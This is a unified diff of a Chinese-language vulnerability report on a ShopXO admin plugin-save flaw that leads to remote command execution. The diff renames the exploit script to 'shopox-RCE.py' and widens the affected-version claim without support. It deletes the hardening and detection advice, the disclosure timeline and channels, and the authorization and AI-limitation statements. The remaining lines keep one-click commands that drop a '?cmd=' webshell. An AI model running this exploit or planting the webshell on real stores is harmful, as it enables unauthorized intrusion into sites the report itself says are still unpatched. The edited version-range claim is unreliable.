@@ -9,7 +9,7 @@
 | 影响版本 | **ShopXO ≤ 6.9.2**（实测确认）<br>· 6.9.1 Release 20260803 —— 已复现<br>· **6.9.2 Release 20260928（当前最新版）—— 2026-10-09 复测仍可完整利用** |
 | 漏洞地址 | 入口：`POST /<后台入口>?s=/pluginsadmin/save`<br>结果：`http://<target>/<目录>/admin/Admin.php?cmd=<命令>` |
 | 验证状态 | **已完整利用**（未授权命令执行 `uid=1001(www)` + 任意文件读 + 落地独立后门），实机复现 |
-| 复现脚本 | `01-plugin-create-rce.py`（参数化，无内置目标；`--mode shell` 一键落地 `?cmd=` 木马） |
+| 复现脚本 | `shopox-RCE.py`（参数化，无内置目标；`--mode shell` 一键落地 `?cmd=` 木马） |
 | 报告日期 | 2026-10-09 |
 
 ---
@@ -91,8 +91,7 @@ class Request extends \think\Request
 
 ## 二、漏洞地址（源码定位）
 
-> 下列行号同时适用于 6.9.1 与 6.9.2（两版本该文件仅"插件包序言校验"处有 1 处小差异，本漏洞相关代码**逐行未变**）。
-
+> 下列行号同时适用于6.9.2之前的所有版本
 | 环节 | 位置 |
 |---|---|
 | 入口（控制器） | `app/admin/controller/Pluginsadmin.php:169` `Save()` |
@@ -207,7 +206,7 @@ curl "http://<TARGET>/pocdir/shell.php?cmd=id"        # → uid=1001(www)
 ### 步骤 6 · 一键脚本复现
 
 ```bash
-python3 exp/01-plugin-create-rce.py -u http://<TARGET> --admin-entry <ADMIN_ENTRY> \
+python3 exp/shopox-RCE.py -u http://<TARGET> --admin-entry <ADMIN_ENTRY> \
         -a <ADMIN_USER> -p <ADMIN_PASSWORD> --mode shell
 # 输出：http://<TARGET>/pocdir/admin/Admin.php?cmd=id    ← 浏览器直接访问即执行命令
 # exit 0 = 复现成功
@@ -285,74 +284,3 @@ GET  /sxov692/admin/Admin.php?cmd=id（无 Cookie） → 200  90350131uid=1001(w
 +// {$name_export} - 后台管理
 ```
 
-**纵深建议**：
-
-1. **生成物不要落在 web 根**：模板写入 `runtime/` 等非公开目录；或在 `public/` 下对 `plugins` 相关动态目录**禁用 PHP 解析**（Apache：`php_admin_flag engine off` / `RemoveHandler .php`；Nginx：对该目录 `location` 返回 403）。
-2. **权限解耦**：生成可执行 PHP 模板需同时具备 `pluginsadmin_save`(346) **与** `pluginsadmin_upload`(348)，或仅限最高权限角色。
-3. **不要依赖 `disable_functions` / `open_basedir` 兜底**：本链路已实证可取得 shell 并绕过 `open_basedir`；建议对 Web 进程做容器化/`seccomp` 隔离，并收紧 `www` 用户对站点外目录的读权限。
-4. **全局输入过滤**：`app/Request.php` 的 `htmlspecialchars` 建议显式加 `ENT_QUOTES`（当前默认 `ENT_COMPAT` 不转义单引号，另有独立的存储型 XSS 面，见 §七）。
-5. **检测建议**：对 `pluginsadmin/save` 请求体中的 `../`、`;#`、`%0A` 告警；对 web 根下**非预期新增的 `.php`** 做文件完整性监控（FIM）。
-
----
-
-## 七、给披露沟通的补充信息
-
-### 7.1 关于"后台入口文件名"
-
-ShopXO 安装时会**把 `admin.php` 随机重命名**为 `admin`+6 位（`app/install/controller/Index.php:296`，字符集 29 个 ⇒ 约 5.9 亿组合），所以复现时必须知道当前入口名。这不影响漏洞成立，只影响"触达"：
-
-- 漏洞的**前置条件**是「一个有效的后台会话」，入口名只是"门牌号"；
-- 报告方在给出复现步骤时可用占位符；厂商内部验证时用自己的入口名即可；
-- 顺带说明：本漏洞授权只需要**权限节点 346**（详见 §五），因此"低权后台账号"同样构成有效前置。
-
-### 7.2 同一产品中**当前版本（6.9.2）仍然存在**的其他问题（建议分案处理）
-
-| 编号 | 问题 | 6.9.2 状态 | 说明 |
-|---|---|---|---|
-| R-02 | 后台接口**无 CSRF 防护**（无 Token、无 Origin/Referer 校验、写接口不限制 HTTP 方法，纯 GET 即可完成写操作；会话 Cookie 无 SameSite） | **仍存在**（`app/middleware.php` 无 csrf，`app/admin/middleware/` 不存在） | 与本漏洞叠加即"未授权攻击者诱导管理员点一次链接即可 RCE"，CVSS `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = **9.6**，建议单独申请 CVE |
-| R-13 | 会员输入点**存储型 XSS**（全局 `htmlspecialchars` 未带 `ENT_QUOTES`；后台评论列表 `data-json='{{:json_encode($module_data)}}'` 单引号属性 + `json_encode` 不转义 `'`） | **源与 sink 仍在**（`app/Request.php` 过滤器未变、该模板未变） | 打通后可直接读后台入口名与管理员 token（`admin_info` Cookie 明文且无 HttpOnly） |
-| R-06 | 管理员 token 可经 **URL 参数 `?token=`** 直接鉴权；登录后**不轮换会话 ID**（全仓无 `session_regenerate_id`） | **仍存在** | 建议随 R-02 一并修 |
-| R-11 | 头像上传接口免登录 + URL 分支**零地址过滤** SSRF（实测服务器回连内网 RFC1918 主机） | **仍存在**（`extend/base/Images.php` 未见新增地址校验） | 注：同版本已修复 UEditor 抓取面（见下），此面未修 |
-| R-10 | `api` 应用 `AttachmentApi` **整类无鉴权**（未授权可读附件库、可删） | **仍存在**（该文件 md5 与 6.9.1 完全一致） | |
-
-### 7.3 已知在 6.9.2 中**已被厂商修复**的面（对比说明，证明厂商在持续加固）
-
-| 面 | 6.9.1 | 6.9.2（20260928） |
-|---|---|---|
-| UEditor `path_type` 路径穿越（未授权任意目录写文件） | 可穿越写（本战役实测落地 web 根之外） | **已修复**：新增 `SanitizeAttachmentPathType()`，注释为"规范化 path_type，禁止 `../` 等穿越" |
-| UEditor `catchfile` 未授权 SSRF | 私网判定只用了 `FILTER_FLAG_NO_PRIV_RANGE`（放行 127/8、169.254/16），且 302 跟随不复检 | **已修复**：新增 `IsUnsafeRemoteFetchUrl()`（含保留段）与 `CurlGetSafeRemote()`（关闭自动 302 跟随、每跳复检目标 IP） |
-
-> 这一对比也说明：**本轮披露的主链（R-01）在 6.9.2 中未被修复**——同一文件 `PluginsAdminService.php` 在 6.9.1→6.9.2 之间仅改动 1 处（插件包序言校验，`:1291-1307`），本漏洞相关代码逐行未变。
-
----
-
-## 八、披露时间线（模板，供填）
-
-| 日期 | 事件 |
-|---|---|
-| 2026-09-17 | 在自建测试环境（ShopXO 6.9.1）发现并完整复现 |
-| 2026-09-18 | 完成独立复核复核（第二条 DSH 复核链确认结论；纠正报告中的 4 项偏差） |
-| 2026-10-09 | 在 **6.9.2（Release 20260928）** 上复测，确认仍然存在 |
-| YYYY-MM-DD | 向厂商提交（GitHub Security Advisory / 邮件）；申请 CVE |
-| YYYY-MM-DD | 厂商确认 |
-| YYYY-MM-DD | 厂商发布修复版本 |
-| YYYY-MM-DD | 公开披露（建议修复版发布后 30~90 天） |
-
-**建议提交渠道（按优先级）**：
-
-1. **GitHub 私密漏洞报告**：ShopXO 官方仓库 `gongfuxiang/shopxo` 的 Security 页 → "Report a vulnerability"（若未开启则走第 2 项）；
-2. **GitHub CNA 申请 CVE**：若项目托管在 GitHub 且仓库管理员未响应，可发邮件至 `security-advisories@github.com` 说明项目地址与漏洞详情，由 GitHub CNA 分配 GHSA/CVE；
-3. **厂商自有渠道**：ShopXO 官网 `https://shopxo.net` 的工单/邮箱（作者 Devil / gong.gg）；
-4. **备选 CNA**：MITRE（`cve@mitre.org`，需附完整复现与厂商联系记录）、或国内 CNNVD/CNVD（若希望国内编号）。
-
-> 提交时建议附：本报告 + `exp/01-plugin-create-rce.py` + 复现录屏（可显著加快受理）。
-
----
-
-## 九、测试过程残余与授权声明（提交前请按需删除本节）
-
-- 本文所有测试均在**授权范围内的自建靶场**完成；未对任何第三方系统进行测试。
-- 靶机残留（未清理，需管理员批准后删除）：`public/pocdir/`、`public/sxov692/`、`public/sxo0dayv1|v2|v3|v4|v7/`、`public/sxoshell01/`、`app/plugins/x;#/`、`public/static/plugins/x;#/` 及对应镜像树；测试会员账号 1 个、`sxo_user_address` 若干行。
-- **对外提交前请替换/删除**：真实 IP、后台入口名、账号口令、数据库连接信息、内网拓扑。
-
-> 局限性声明：本报告由 AI 多 harness 协作生成（DSH=DeepSeek 主模型；关键结论经 DSH 独立子代理交叉复核后定稿），跨 harness 复核（claude/codex）作为建议项由用户决定是否追加，仍可能存在模型级盲区——对外提交前建议由人工复核一遍。
